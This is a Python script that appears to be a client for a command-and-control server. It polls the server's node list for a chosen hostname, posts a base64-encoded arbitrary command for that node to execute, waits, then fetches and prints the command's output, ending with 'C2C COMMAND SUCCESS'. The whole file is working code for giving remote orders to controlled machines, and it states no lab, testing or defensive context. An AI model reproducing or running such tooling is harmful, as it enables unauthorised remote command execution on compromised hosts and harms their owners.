import requests
import time
import sys
from base64 import b64encode

base_url = sys.argv[1]
hostname = sys.argv[2]
command = sys.argv[3]
max_min_timeout_wait = int(sys.argv[4])
time_to_wait_for_result = 30 + int(sys.argv[5])

debug = False
if len(sys.argv) > 6:
    debug = str(sys.argv[6]).lower() == "debug"

if debug: print("Running with debugging enabled...")

def get_nodes():
    r = requests.get(base_url + '/control/list')
    if debug: print("Connected nodes:")
    if debug: print(r.json())
    return r.json()

def run_command(node, command):
    url = base_url + '/control/execute/' + node['id']

    command_b64 = str(b64encode(command.encode("utf-8")), "utf-8")

    r = requests.post(url, json={'command': command_b64})
    if debug: print(f"Submitted command for node {node} to C2C server:\n{command}")
    return r.json()

def read_result(node):
    url = base_url + '/control/buff/' + node['id']
    if debug: print(f"Reading result for node {node}...")
    r = requests.get(url)
    return r.json()

timeout = time.time() + 60*max_min_timeout_wait
node = None

if debug: print(f"Start scanning connected nodes to find node {hostname}")
while True:
    nodes = get_nodes()
    node = next((n for n in nodes if n['hostname'].upper() == hostname.upper()), None)
    if node is not None:
        break
    elif time.time() > timeout:
        print(f'ERROR: Could not find {hostname}. Wait timeout exceeded!')
        exit()
    if debug: print("Trying again in 5 seconds...")
    time.sleep(5)

run_command(node, command)

time.sleep(30)

output = read_result(node)

print(output)
print('C2C COMMAND SUCCESS')
